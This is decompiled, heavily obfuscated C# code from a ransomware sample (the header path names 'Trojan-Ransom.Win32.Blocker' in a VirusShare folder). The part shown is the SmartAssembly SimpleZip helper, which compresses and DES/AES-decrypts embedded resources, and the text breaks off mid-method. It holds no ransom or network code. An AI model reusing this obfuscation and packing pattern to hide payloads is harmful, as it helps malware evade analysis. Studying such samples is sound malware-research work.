// Decompiled with JetBrains decompiler
// Type: SmartAssembly.Zip.SimpleZip
// Assembly: o4tdggb3, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FA0844EB-EF82-404C-B76C-C092ABDB9392
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.bzqq-b74e3dc76fae79b75c26f27ecb85aae1eae4082a42bfa080f7805f32dedc9d67.exe

using Microsoft.VisualBasic.CompilerServices;
using My;
using SmartAssembly.Attributes;
using SmartAssembly.Shared;
using SmartAssembly.SmartExceptionsCore;
using SmartAssembly.SmartExceptionsCore.UI;
using SmartAssembly.SmartUsageCore;
using System;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using System.Xml;
using Ⴈ;

namespace SmartAssembly.Zip
{
  public class SimpleZip
  {
    public static string ExceptionMessage;
    private static readonly char[] Ⴍ;
    private static readonly char[] Ⴗ;
    private static readonly string[] Ⴅ;
    internal static SimpleZip.Ⴃ Ⴈ;
    private static readonly char[] ႭႠ;
    private static readonly char[] ႭႼ;
    private static readonly string[] ႷႳ;
    internal static SimpleZip.ႷႭ ႷႷ;

    private static bool Ⴐ(Assembly Ⴗ, Assembly Ⴄ)
    {
      int num1;
      byte[] numArray1;
      byte[] numArray2;
      bool flag;
      int index;
      try
      {
        try
        {
          num1 = 1;
          while (true)
          {
            switch (num1)
            {
              case 0:
                num1 = index < numArray2.Length ? 11 : 12;
                continue;
              case 2:
                num1 = numArray2 == null ? 12 : 10;
                continue;
              case 3:
                num1 = numArray2 == null == (numArray1 == null) ? 2 : 7;
                continue;
              case 4:
                num1 = 0;
                continue;
              case 5:
                goto label_10;
              case 7:
                goto label_5;
              case 8:
              case 13:
                ++index;
                num1 = 0;
                continue;
              case 9:
                goto label_15;
              case 10:
                index = 0;
                goto case 4;
              case 11:
                num1 = (int) numArray2[index] == (int) numArray1[index] ? 8 : 5;
                continue;
              case 12:
                goto label_13;
              case 14:
                numArray2 = DoNotObfuscateTypeAttribute.Ⴍ(WaitSendingReportControl.Ⴍ(Ⴄ, 504, 477), 829, 872);
                num1 = 3;
                continue;
              default:
                numArray1 = DoNotObfuscateTypeAttribute.Ⴍ(WaitSendingReportControl.Ⴍ(Ⴗ, 862, 891), 888, 813);
                num1 = 14;
                continue;
            }
          }
label_5:
          flag = false;
          goto label_15;
label_10:
          flag = false;
          goto label_15;
label_13:
          flag = true;
        }
        catch (Exception ex)
        {
          byte[] o1 = numArray1;
          byte[] o2 = numArray2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) index;
          Assembly o4 = Ⴗ;
          Assembly o5 = Ⴄ;
          StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5);
          throw;
        }
label_15:
        switch (1)
        {
          default:
            return flag;
        }
      }
      catch (Exception ex)
      {
        byte[] o1 = numArray1;
        byte[] o2 = numArray2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) index;
        // ISSUE: variable of a boxed type
        __Boxed<bool> o4 = (ValueType) flag;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) num1;
        int num2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o6 = (ValueType) num2;
        Assembly o7 = Ⴗ;
        Assembly o8 = Ⴄ;
        StackFrameHelper.CreateException8(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6, (object) o7, (object) o8);
        throw;
      }
    }

    public static byte[] Unzip(byte[] buffer)
    {
      int num1;
      Assembly Ⴄ;
      Assembly Ⴗ1;
      byte[] numArray1;
      SimpleZip.ႭႰ ⴍⴐ;
      byte[] Ⴀ;
      int num2;
      short num3;
      int num4;
      int num5;
      int length1;
      int length2;
      int length3;
      byte[] numArray2;
      byte[] numArray3;
      byte[] Ⴐ1;
      SimpleZip.ႤႰ ⴄⴐ1;
      int num6;
      int length4;
      int Ⴓ;
      int length5;
      int Ⴗ2;
      byte[] Ⴐ2;
      SimpleZip.ႤႰ ⴄⴐ2;
      byte[] key1;
      byte[] iv1;
      DESCryptoIndirector cryptoIndirector1;
      int num7;
      ICryptoTransform desCryptoTransform;
      int num8;
      byte[] buffer1;
      int num9;
      int num10;
      int num11;
      int num12;
      byte[] key2;
      byte[] iv2;
      AESCryptoIndirector cryptoIndirector2;
      int num13;
      ICryptoTransform aesCryptoTransform;
      int num14;
      byte[] buffer2;
      int num15;
      int num16;
      int num17;
      int num18;
      object[] objArray;
      try
      {
        try
        {
          num1 = 11;
          while (true)
          {
            switch (num1)
            {
              case 0:
                length4 = ⴍⴐ.Ⴅ();
                Ⴀ = new byte[length4];
                Ⴓ = 0;
                num1 = 3;
                continue;
              case 1:
                numArray2 = new byte[length2];
                SecurityExceptionEventArgs.Ⴓ((Stream) ⴍⴐ, numArray2, 0, length2, 136, 221);
                num1 = 32;
                continue;
              case 2:
                ⴄⴐ1 = new SimpleZip.ႤႰ(Ⴐ1);
                Ⴀ = new byte[length1];
                ⴄⴐ1.Ⴍ(Ⴀ, 0, Ⴀ.Length);
                num1 = 14;
                continue;
              case 3:
                num1 = Ⴓ < length4 ? 22 : 20;
                continue;
              case 4:
                goto label_12;
              case 5:
                SecurityExceptionEventArgs.Ⴓ((Stream) ⴍⴐ, Ⴐ1, 0, Ⴐ1.Length, 186, 239);
                num1 = 2;
                continue;
              case 6:
              case 12:
                num1 = num6 != 1 ? 20 : 0;
                continue;
              case 7:
                ⴍⴐ = new SimpleZip.ႭႰ(buffer);
                Ⴀ = new byte[0];
                num2 = ⴍⴐ.Ⴅ();
                num1 = num2 != 67324752 ? 31 : 9;
                continue;
              case 8:
                num1 = num4 != 0 ? 4 : 27;
                continue;
              case 9:
                num3 = (short) ⴍⴐ.Ⴗ();
                num4 = ⴍⴐ.Ⴗ();
                num5 = ⴍⴐ.Ⴗ();
                num1 = 23;
                continue;
              case 10:
              case 23:
                num1 = num2 != 67324752 ? 4 : 15;
                continue;
              case 13:
                ⴍⴐ.Ⴅ();
                ⴍⴐ.Ⴅ();
                ⴍⴐ.Ⴅ();
                length1 = ⴍⴐ.Ⴅ();
                num1 = 25;
                continue;
              case 14:
                goto label_21;
              case 15:
                num1 = num3 != (short) 20 ? 4 : 8;
                continue;
              case 16:
                num1 = SimpleZip.Ⴐ(Ⴗ1, Ⴄ) ? 7 : 26;
                continue;
              case 17:
                byte[] numArray4 = new byte[8];
                // ISSUE: field reference
                UsageReportSender.Ⴀ((Array) numArray4, __fieldref (\u003CPrivateImplementationDetails\u003E.\u0024\u0024method0x600000b\u002D1), 966, 999);
                key1 = numArray4;
                byte[] numArray5 = new byte[8];
                // ISSUE: field reference
                UsageReportSender.Ⴀ((Array) numArray5, __fieldref (\u003CPrivateImplementationDetails\u003E.\u0024\u0024method0x600000b\u002D2), 897, 928);
                iv1 = numArray5;
                num1 = 33;
                continue;
              case 18:
              case 30:
                numArray3 = new byte[length3];
                SecurityExceptionEventArgs.Ⴓ((Stream) ⴍⴐ, numArray3, 0, length3, 710, 659);
                num1 = 21;
                continue;
              case 20:
                if (num6 == 2)
                {
                  num1 = 17;
                  continue;
                }
                goto label_51;
              case 21:
                Ⴐ1 = new byte[Ⴈ.Ⴀ.Ⴄ((Stream) ⴍⴐ, 507, 466) - Ⴈ.Ⴀ.Ⴄ((Stream) ⴍⴐ, 737, 715)];
                num1 = 5;
                continue;
              case 22:
                length5 = ⴍⴐ.Ⴅ();
                Ⴗ2 = ⴍⴐ.Ⴅ();
                Ⴐ2 = new byte[length5];
                SecurityExceptionEventArgs.Ⴓ((Stream) ⴍⴐ, Ⴐ2, 0, Ⴐ2.Length, 906, 991);
                num1 = 28;
                continue;
              case 24:
                num1 = (object) Ⴄ == (object) Ⴗ1 ? 7 : 16;
                continue;
              case 25:
                length2 = ⴍⴐ.Ⴗ();
                length3 = ⴍⴐ.Ⴗ();
                num1 = length2 <= 0 ? 32 : 1;
                continue;
              case 26:
                goto label_5;
              case 27:
                num1 = num5 == 8 ? 13 : 4;
                continue;
              case 28:
                ⴄⴐ2 = new SimpleZip.ႤႰ(Ⴐ2);
                ⴄⴐ2.Ⴍ(Ⴀ, Ⴓ, Ⴗ2);
                Ⴓ += Ⴗ2;
                num1 = 3;
                continue;
              case 29:
                if (num2 == 8223355)
                {
                  num1 = 6;
                  continue;
                }
                goto label_76;
              case 31:
                num6 = num2 >> 24;
                num2 -= num6 << 24;
                num1 = 29;
                continue;
              case 32:
                num1 = length3 <= 0 ? 21 : 18;
                continue;
              case 33:
                goto label_33;
              default:
                Ⴄ = SimpleZip.ႤႤ.Ⴗ(182, 241);
                Ⴗ1 = SmartAssembly.SmartUsageCore.DoNotPruneAttribute.Ⴐ(787, 891);
                num1 = 24;
                continue;
            }
          }
label_5:
          numArray1 = (byte[]) null;
          goto label_81;
label_12:
          throw new FormatException(SimpleZip.Ⴓ(661402974, 4));
label_21:
          Ⴐ1 = (byte[]) null;
          goto label_78;
label_33:
          cryptoIndirector1 = new DESCryptoIndirector();
          try
          {
            num7 = 4;
            switch (num7)
            {
              default:
                desCryptoTransform = cryptoIndirector1.GetDESCryptoTransform(key1, iv1, true);
                try
                {
                  num8 = 3;
                  while (true)
                  {
                    switch (num8)
                    {
                      case 1:
                        goto label_45;
                      case 5:
                        goto label_39;
                      default:
                        buffer1 = desCryptoTransform.TransformFinalBlock(buffer, 4, buffer.Length - 4);
                        num8 = 5;
                        continue;
                    }
                  }
label_39:
                  Ⴀ = SimpleZip.Unzip(buffer1);
                }
                finally
                {
                  num9 = 4;
                  while (true)
                  {
                    switch (num9)
                    {
                      case 2:
                        goto label_43;
                      case 5:
                        goto label_44;
                      default:
                        num9 = desCryptoTransform == null ? 5 : 2;
                        continue;
                    }
                  }
label_43:
                  desCryptoTransform.Dispose();
label_44:;
                }
label_45:
                num10 = 2;
                switch (num10)
                {
                }
                break;
            }
          }
          finally
          {
            num11 = 2;
            while (true)
            {
              switch (num11)
              {
                case 0:
                  goto label_50;
                case 6:
                  goto label_49;
                default:
                  num11 = cryptoIndirector1 == null ? 0 : 6;
                  continue;
              }
            }
label_49:
            cryptoIndirector1.Dispose();
label_50:;
          }
label_51:
          num12 = 5;
          while (true)
          {
            switch (num12)
            {
              case 0:
              case 1:
              case 6:
                num12 = 2;
                continue;
              case 2:
                goto label_57;
              case 3:
                byte[] numArray6 = new byte[16];
                // ISSUE: field reference
                UsageReportSender.Ⴀ((Array) numArray6, __fieldref (\u003CPrivateImplementationDetails\u003E.\u0024\u0024method0x600000b\u002D3), 638, 607);
                key2 = numArray6;
                byte[] numArray7 = new byte[16];
                // ISSUE: field reference
                UsageReportSender.Ⴀ((Array) numArray7, __fieldref (\u003CPrivateImplementationDetails\u003E.\u0024\u0024method0x600000b\u002D4), 803, 770);
                iv2 = numArray7;
                goto case 0;
              default:
                if (num6 == 3)
                {
                  num12 = 3;
                  continue;
                }
                goto label_78;
            }
          }
label_57:
          cryptoIndirector2 = new AESCryptoIndirector();
          try
          {
            num13 = 4;
            switch (num13)
            {
              default:
                aesCryptoTransform = cryptoIndirector2.GetAESCryptoTransform(key2, iv2, true);
                try
                {
                  num14 = 2;
                  while (true)
                  {
                    switch (num14)
                    {
                      case 1:
                        goto label_64;
                      case 4:
                        num14 = 1;
                        continue;
                      default:
                        buffer2 = aesCryptoTransform.TransformFinalBlock(buffer, 4, buffer.Length - 4);
                        goto case 4;
                    }
                  }
label_64:
                  Ⴀ = SimpleZip.Unzip(buffer2);
                }
                finally
                {
                  num15 = 1;
                  while (true)
                  {
                    switch (num15)
                    {
                      case 0:
                      case 4:
                      case 6:
                        goto label_68;
                      case 2:
                        goto label_69;
                      default:
                        num15 = aesCryptoTransform == null ? 2 : 4;
                        continue;
                    }
                  }
label_68:
                  aesCryptoTransform.Dispose();
label_69:;
                }
                num16 = 4;
                switch (num16)
                {
                  default:
                    goto label_78;
                }
            }
          }
          finally
          {
            num17 = 6;
            while (true)
            {
              switch (num17)
              {
                case 0:
                case 5:
                  goto label_74;
                case 2:
                  goto label_75;
                default:
                  num17 = cryptoIndirector2 == null ? 2 : 0;
                  continue;
              }
            }
label_74:
            cryptoIndirector2.Dispose();
label_75:;
          }
label_76:
          num18 = 0;
          switch (num18)
          {
            case 1:
            case 3:
              break;
            case 5:
              goto label_79;
            default:
              throw new FormatException(Ⴈ.ႷႭ.ႥႳ(1491049431, 7));
          }
label_78:
          Ⴈ.Ⴐ.Ⴈ((Stream) ⴍⴐ, 355, 325);
          ⴍⴐ = (SimpleZip.ႭႰ) null;
label_79:
          numArray1 = Ⴀ;
        }
        catch (Exception ex)
        {
          objArray = new object[33]
          {
            (object) Ⴄ,
            (object) Ⴗ1,
            (object) ⴍⴐ,
            (object) Ⴀ,
            (object) num2,
            (object) num3,
            (object) num4,
            (object) num5,
            (object) length1,
            (object) length2,
            (object) length3,
            (object) numArray2,
            (object) numArray3,
            (object) Ⴐ1,
            (object) ⴄⴐ1,
            (object) num6,
            (object) length4,
            (object) Ⴓ,
            (object) length5,
            (object) Ⴗ2,
            (object) ⴄⴐ2,
            (object) Ⴐ2,
            (object) key1,
            (object) iv1,
            (object) cryptoIndirector1,
            (object) desCryptoTransform,
            (object) buffer1,
            (object) key2,
            (object) iv2,
            (object) cryptoIndirector2,
            (object) aesCryptoTransform,
            (object) buffer2,
            (object) buffer
          };
          object[] objects = objArray;
          StackFrameHelper.CreateExceptionN(ex, objects);
          throw;
        }
label_81:
        switch (1)
        {
          default:
            return numArray1;
        }
      }
      catch (Exception ex)
      {
        int num19;
        object[] objects = new object[49]
        {
          (object) Ⴄ,
          (object) Ⴗ1,
          (object) ⴍⴐ,
          (object) Ⴀ,
          (object) num2,
          (object) num3,
          (object) num4,
          (object) num5,
          (object) length1,
          (object) length2,
          (object) length3,
          (object) numArray2,
          (object) numArray3,
          (object) Ⴐ1,
          (object) ⴄⴐ1,
          (object) num6,
          (object) length4,
          (object) Ⴓ,
          (object) length5,
          (object) Ⴗ2,
          (object) ⴄⴐ2,
          (object) Ⴐ2,
          (object) key1,
          (object) iv1,
          (object) cryptoIndirector1,
          (object) desCryptoTransform,
          (object) buffer1,
          (object) key2,
          (object) iv2,
          (object) cryptoIndirector2,
          (object) aesCryptoTransform,
          (object) buffer2,
          (object) objArray,
          (object) numArray1,
          (object) num1,
          (object) num7,
          (object) num8,
          (object) num9,
          (object) num10,
          (object) num11,
          (object) num12,
          (object) num13,
          (object) num14,
          (object) num15,
          (object) num16,
          (object) num17,
          (object) num18,
          (object) num19,
          (object) buffer
        };
        StackFrameHelper.CreateExceptionN(ex, objects);
        throw;
      }
    }

    public static byte[] Zip(byte[] buffer)
    {
      try
      {
        byte[] numArray;
        try
        {
          numArray = SimpleZip.Ⴄ(buffer, 1, (byte[]) null, (byte[]) null);
        }
        catch (Exception ex)
        {
          byte[] o1 = buffer;
          StackFrameHelper.CreateException1(ex, (object) o1);
          throw;
        }
        return numArray;
      }
      catch (Exception ex)
      {
        byte[] numArray;
        byte[] o1 = numArray;
        byte[] o2 = buffer;
        StackFrameHelper.CreateException2(ex, (object) o1, (object) o2);
        throw;
      }
    }

    public static byte[] ZipAndEncrypt(byte[] buffer, byte[] key, byte[] iv)
    {
      try
      {
        byte[] numArray;
        try
        {
          numArray = SimpleZip.Ⴄ(buffer, 2, key, iv);
        }
        catch (Exception ex)
        {
          byte[] o1 = buffer;
          byte[] o2 = key;
          byte[] o3 = iv;
          StackFrameHelper.CreateException3(ex, (object) o1, (object) o2, (object) o3);
          throw;
        }
        return numArray;
      }
      catch (Exception ex)
      {
        byte[] numArray;
        byte[] o1 = numArray;
        byte[] o2 = buffer;
        byte[] o3 = key;
        byte[] o4 = iv;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    public static byte[] ZipAndAES(byte[] buffer, byte[] key, byte[] iv)
    {
      try
      {
        byte[] numArray;
        try
        {
          numArray = SimpleZip.Ⴄ(buffer, 3, key, iv);
        }
        catch (Exception ex)
        {
          byte[] o1 = buffer;
          byte[] o2 = key;
          byte[] o3 = iv;
          StackFrameHelper.CreateException3(ex, (object) o1, (object) o2, (object) o3);
          throw;
        }
        return numArray;
      }
      catch (Exception ex)
      {
        byte[] numArray;
        byte[] o1 = numArray;
        byte[] o2 = buffer;
        byte[] o3 = key;
        byte[] o4 = iv;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    private static byte[] Ⴄ(byte[] Ⴗ, int Ⴄ, byte[] Ⴈ, byte[] Ⴃ)
    {
      int num1;
      SimpleZip.ႭႰ ⴍⴐ;
      SimpleZip.ႤႷ ⴄⴗ1;
      DateTime dateTime;
      long Ⴈ1;
      uint[] numArray1;
      uint maxValue;
      uint Ⴈ2;
      int num2;
      int length;
      long num3;
      byte[] numArray2;
      byte[] Ⴗ1;
      int num4;
      byte[] Ⴗ2;
      int num5;
      long Ⴈ3;
      int num6;
      byte[] Ⴓ;
      long num7;
      SimpleZip.ႤႷ ⴄⴗ2;
      byte[] Ⴗ3;
      int num8;
      byte[] Ⴗ4;
      int num9;
      long num10;
      byte[] inputBuffer1;
      DESCryptoIndirector cryptoIndirector1;
      int num11;
      ICryptoTransform desCryptoTransform;
      int num12;
      byte[] numArray3;
      int num13;
      int num14;
      int num15;
      int num16;
      byte[] inputBuffer2;
      AESCryptoIndirector cryptoIndirector2;
      int num17;
      ICryptoTransform aesCryptoTransform;
      int num18;
      byte[] numArray4;
      int num19;
      int num20;
      int num21;
      int num22;
      byte[] numArray5;
      int num23;
      byte[] numArray6;
      object[] objArray;
      try
      {
        try
        {
          try
          {
            num1 = 9;
            while (true)
            {
              switch (num1)
              {
                case 0:
                  num1 = 29;
                  continue;
                case 1:
                  ⴍⴐ.Ⴃ(0);
                  ⴍⴐ.Ⴃ(8);
                  ⴍⴐ.Ⴄ((int) Ⴈ1);
                  num1 = 39;
                  continue;
                case 2:
                  ⴄⴗ2 = new SimpleZip.ႤႷ();
                  ⴄⴗ2.Ⴅ(Ⴓ);
                  num1 = 40;
                  continue;
                case 3:
                  ⴄⴗ2.Ⴃ();
                  num1 = 18;
                  continue;
                case 4:
                  ⴍⴐ.Ⴃ(0);
                  Ⴈ.Ⴐ.Ⴐ((Stream) ⴍⴐ, num3, SeekOrigin.Begin, 958, 927);
                  num1 = 42;
                  continue;
                case 5:
                  num6 += Ⴓ.Length;
                  num1 = 38;
                  continue;
                case 6:
                  Ⴈ3 = ⴄⴗ1.Ⴍ();
                  ⴍⴐ.Ⴄ(33639248);
                  ⴍⴐ.Ⴃ(20);
                  ⴍⴐ.Ⴃ(20);
                  num1 = 26;
                  continue;
                case 7:
                  ⴄⴗ1 = new SimpleZip.ႤႷ();
                  dateTime = UsageReportSender.Ⴈ(208, 194);
                  Ⴈ1 = (long) ((uint) ((Ⴈ.Ⴓ.Ⴓ(ref dateTime, 776, 871) - 1980 & (int) sbyte.MaxValue) << 25 | Ⴈ.ႳႤ.Ⴐ(ref dateTime, 781, 835) << 21 | PoweredByAttribute1.Ⴃ(ref dateTime, 993, 918) << 16 | PoweredByAttribute1.Ⴃ(ref dateTime, 778, 882) << 11 | ႷႥ.Ⴐ(ref dateTime, 113, 15) << 5) | (uint) Ⴈ.Ⴓ.Ⴓ(ref dateTime, 339, 291) >> 1);
                  num1 = 28;
                  continue;
                case 8:
                  ⴍⴐ.Ⴄ(25000571);
                  ⴍⴐ.Ⴄ(Ⴗ.Length);
                  num6 = 0;
                  num1 = 38;
                  continue;
                case 10:
                  AppPathFinder.Ⴍ((Array) Ⴗ, num6, (Array) Ⴓ, 0, Ⴓ.Length, 727, 716);
                  num1 = 11;
                  continue;
                case 11:
                  num7 = Ⴈ.Ⴀ.Ⴄ((Stream) ⴍⴐ, 750, 708);
                  ⴍⴐ.Ⴄ(0);
                  ⴍⴐ.Ⴄ(Ⴓ.Length);
                  num1 = 2;
                  continue;
                case 12:
                  ⴍⴐ.Ⴄ(Ⴗ.Length);
                  numArray2 = ႷႨ.Ⴄ(ႷႼ.Ⴗ(596, 521), SimpleZip.Ⴓ(661402805, 6), 631, 513);
                  num1 = 13;
                  continue;
                case 13:
                  ⴍⴐ.Ⴃ(numArray2.Length);
                  ⴍⴐ.Ⴃ(0);
                  ReportSender1.Ⴍ((Stream) ⴍⴐ, numArray2, 0, numArray2.Length, 26, 100);
                  num1 = 24;
                  continue;
                case 14:
                  Ⴗ4 = new byte[512];
                  num9 = ⴄⴗ2.Ⴗ(Ⴗ4);
                  num1 = num9 <= 0 ? 43 : 16;
                  continue;
                case 15:
                  goto label_91;
                case 16:
                  ReportSender1.Ⴍ((Stream) ⴍⴐ, Ⴗ4, 0, num9, 635, 517);
                  goto case 18;
                case 17:
                  Ⴓ = new byte[Ⴈ.Ⴗ.Ⴃ(2097151, Ⴗ.Length - num6, 269, 376)];
                  num1 = 10;
                  continue;
                case 18:
                  num1 = !ⴄⴗ2.Ⴓ() ? 14 : 43;
                  continue;
                case 19:
                  ⴍⴐ.Ⴃ(numArray2.Length);
                  ⴍⴐ.Ⴃ(0);
                  ⴍⴐ.Ⴃ(0);
                  num1 = 21;
                  continue;
                case 21:
                case 48:
                  ⴍⴐ.Ⴃ(0);
                  ⴍⴐ.Ⴃ(0);
                  ⴍⴐ.Ⴄ(0);
                  ⴍⴐ.Ⴄ(0);
                  num1 = 44;
                  continue;
                case 22:
                  Ⴈ2 = numArray1[(IntPtr) (uint) (((int) Ⴈ2 ^ (int) Ⴗ[num2++]) & (int) byte.MaxValue)] ^ Ⴈ2 >> 8;
                  num1 = 52;
                  continue;
                case 23:
                  Ⴗ3 = new byte[512];
                  num8 = ⴄⴗ2.Ⴗ(Ⴗ3);
                  num1 = num8 <= 0 ? 3 : 41;
                  continue;
                case 24:
                  ⴄⴗ1.Ⴅ(Ⴗ);
                  num1 = 25;
                  continue;
                case 25:
                  num1 = !ⴄⴗ1.Ⴅ() ? 31 : 30;
                  continue;
                case 26:
                  ⴍⴐ.Ⴃ(0);
                  ⴍⴐ.Ⴃ(8);
                  ⴍⴐ.Ⴄ((int) Ⴈ1);
                  num1 = 50;
                  continue;
                case 27:
                  ReportSender1.Ⴍ((Stream) ⴍⴐ, Ⴗ1, 0, num4, 897, 1023);
                  goto case 25;
                case 28:
                  uint[] numArray7 = new uint[256];
                  // ISSUE: field reference
                  UsageReportSender.Ⴀ((Array) numArray7, __fieldref (\u003CPrivateImplementationDetails\u003E.\u0024\u0024method0x600000f\u002D1), 819, 786);
                  numArray1 = numArray7;
                  maxValue = uint.MaxValue;
                  num1 = 33;
                  continue;
                case 29:
                  ⴍⴐ.Ⴄ((int) ⴄⴗ2.Ⴍ());
                  ReportExceptionEventArgs.Ⴃ((Stream) ⴍⴐ, num10, 106, 100);
                  num1 = 5;
                  continue;
                case 30:
                  ⴄⴗ1.Ⴃ();
                  num1 = 32;
                  continue;
                case 31:
                  Ⴗ1 = new byte[512];
                  num4 = ⴄⴗ1.Ⴗ(Ⴗ1);
                  num1 = num4 <= 0 ? 30 : 27;
                  continue;
                case 32:
                  num1 = !ⴄⴗ1.Ⴓ() ? 47 : 6;
                  continue;
                case 33:
                  Ⴈ2 = maxValue;
                  num2 = 0;
                  length = Ⴗ.Length;
                  num1 = 52;
                  continue;
                case 34:
                  goto label_53;
                case 35:
                  ReportSender1.Ⴍ((Stream) ⴍⴐ, Ⴗ2, 0, num5, 432, 462);
                  goto case 32;
                case 36:
                  ⴍⴐ.Ⴃ(1);
                  ⴍⴐ.Ⴄ(46 + numArray2.Length);
                  num1 = 46;
                  continue;
                case 37:
                  ⴍⴐ.Ⴄ(101010256);
                  ⴍⴐ.Ⴃ(0);
                  ⴍⴐ.Ⴃ(0);
                  ⴍⴐ.Ⴃ(1);
                  goto case 45;
                case 38:
                  num1 = num6 < Ⴗ.Length ? 17 : 15;
                  continue;
                case 39:
                  ⴍⴐ.Ⴄ((int) Ⴈ2);
                  num3 = Ⴈ.Ⴀ.Ⴄ((Stream) ⴍⴐ, 399, 421);
                  ⴍⴐ.Ⴄ(0);
                  num1 = 12;
                  continue;
                case 40:
                  num1 = !ⴄⴗ2.Ⴅ() ? 23 : 3;
                  continue;
                case 41:
                  ReportSender1.Ⴍ((Stream) ⴍⴐ, Ⴗ3, 0, num8, 1012, 906);
                  goto case 40;
                case 42:
                  goto label_32;
                case 43:
                  num10 = Ⴈ.Ⴀ.Ⴄ((Stream) ⴍⴐ, 258, 296);
                  ReportExceptionEventArgs.Ⴃ((Stream) ⴍⴐ, num7, 789, 795);
                  goto case 0;
                case 44:
                  ReportSender1.Ⴍ((Stream) ⴍⴐ, numArray2, 0, numArray2.Length, 794, 868);
                  num1 = 37;
                  continue;
                case 45:
                  num1 = 36;
                  continue;
                case 46:
                  ⴍⴐ.Ⴄ((int) ((long) (30 + numArray2.Length) + Ⴈ3));
                  num1 = 4;
                  continue;
                case 47:
                  Ⴗ2 = new byte[512];
                  num5 = ⴄⴗ1.Ⴗ(Ⴗ2);
                  num1 = num5 <= 0 ? 6 : 35;
                  continue;
                case 49:
                  Ⴈ2 ^= maxValue;
                  ⴍⴐ.Ⴄ(67324752);
                  ⴍⴐ.Ⴃ(20);
                  num1 = 1;
                  continue;
                case 50:
                  ⴍⴐ.Ⴄ((int) Ⴈ2);
                  ⴍⴐ.Ⴄ((int) Ⴈ3);
                  ⴍⴐ.Ⴄ(Ⴗ.Length);
                  num1 = 19;
                  continue;
                case 51:
                  if (Ⴄ == 2)
                  {
                    num1 = 34;
                    continue;
                  }
                  goto label_69;
                case 52:
                  num1 = --length >= 0 ? 22 : 49;
                  continue;
                case 53:
                  num1 = Ⴄ != 1 ? 51 : 8;
                  continue;
                default:
                  ⴍⴐ = new SimpleZip.ႭႰ();
                  num1 = Ⴄ != 0 ? 53 : 7;
                  continue;
              }
            }
label_32:
            ⴍⴐ.Ⴄ((int) Ⴈ3);
            goto label_91;
label_53:
            ⴍⴐ.Ⴄ(41777787);
            inputBuffer1 = SimpleZip.Ⴄ(Ⴗ, 1, (byte[]) null, (byte[]) null);
            cryptoIndirector1 = new DESCryptoIndirector();
            try
            {
              num11 = 0;
              switch (num11)
              {
                default:
                  desCryptoTransform = cryptoIndirector1.GetDESCryptoTransform(Ⴈ, Ⴃ, false);
                  try
                  {
                    num12 = 3;
                    switch (num12)
                    {
                      case 1:
                        break;
                      default:
                        numArray3 = desCryptoTransform.TransformFinalBlock(inputBuffer1, 0, inputBuffer1.Length);
                        ReportSender1.Ⴍ((Stream) ⴍⴐ, numArray3, 0, numArray3.Length, 297, 343);
                        break;
                    }
                  }
                  finally
                  {
                    num13 = 0;
                    while (true)
                    {
                      switch (num13)
                      {
                        case 2:
                        case 5:
                          goto label_61;
                        case 3:
                        case 6:
                          goto label_62;
                        default:
                          num13 = desCryptoTransform == null ? 6 : 5;
                          continue;
                      }
                    }
label_61:
                    desCryptoTransform.Dispose();
label_62:;
                  }
                  num14 = 2;
                  switch (num14)
                  {
                    default:
                      goto label_91;
                  }
              }
            }
            finally
            {
              num15 = 5;
              while (true)
              {
                switch (num15)
                {
                  case 0:
                  case 3:
                  case 6:
                    goto label_68;
                  case 1:
                    goto label_67;
                  default:
                    num15 = cryptoIndirector1 == null ? 0 : 1;
                    continue;
                }
              }
label_67:
              cryptoIndirector1.Dispose();
label_68:;
            }
label_69:
            num16 = 5;
            while (true)
            {
              switch (num16)
              {
                case 0:
                  goto label_73;
                case 1:
                  goto label_74;
                default:
                  if (Ⴄ == 3)
                  {
                    num16 = 0;
                    continue;
                  }
                  goto label_91;
              }
            }
label_73:
            ⴍⴐ.Ⴄ(58555003);
label_74:
            inputBuffer2 = SimpleZip.Ⴄ(Ⴗ, 1, (byte[]) null, (byte[]) null);
            cryptoIndirector2 = new AESCryptoIndirector();
            try
            {
              num17 = 4;
              switch (num17)
              {
                default:
                  aesCryptoTransform = cryptoIndirector2.GetAESCryptoTransform(Ⴈ, Ⴃ, false);
                  try
                  {
                    num18 = 1;
                    switch (num18)
                    {
                      case 2:
                        ReportSender1.Ⴍ((Stream) ⴍⴐ, numArray4, 0, numArray4.Length, 431, 465);
                        break;
                      case 4:
                        break;
                      default:
                        numArray4 = aesCryptoTransform.TransformFinalBlock(inputBuffer2, 0, inputBuffer2.Length);
                        goto case 2;
                    }
                  }
                  finally
                  {
                    num19 = 4;
                    while (true)
                    {
                      switch (num19)
                      {
                        case 1:
                        case 6:
                          goto label_83;
                        case 5:
                          goto label_84;
                        default:
                          num19 = aesCryptoTransform == null ? 5 : 1;
                          continue;
                      }
                    }
label_83:
                    aesCryptoTransform.Dispose();
label_84:;
                  }
                  num20 = 0;
                  switch (num20)
                  {
                  }
                  break;
              }
            }
            finally
            {
              num21 = 4;
              while (true)
              {
                switch (num21)
                {
                  case 1:
                  case 6:
                    goto label_90;
                  case 5:
                    goto label_89;
                  default:
                    num21 = cryptoIndirector2 == null ? 6 : 5;
                    continue;
                }
              }
label_89:
              cryptoIndirector2.Dispose();
label_90:;
            }
label_91:
            num22 = 2;
            while (true)
            {
              switch (num22)
              {
                case 0:
                  num22 = 3;
                  continue;
                case 3:
                  goto label_96;
                case 5:
                  Ⴈ.Ⴐ.Ⴈ((Stream) ⴍⴐ, 562, 532);
                  goto case 0;
                default:
                  MyApplication.Ⴃ((Stream) ⴍⴐ, 389, 438);
                  goto case 5;
              }
            }
label_96:
            numArray5 = Ⴈ.ႳႭ.Ⴃ((MemoryStream) ⴍⴐ, 383, 361);
          }
          catch (Exception ex)
          {
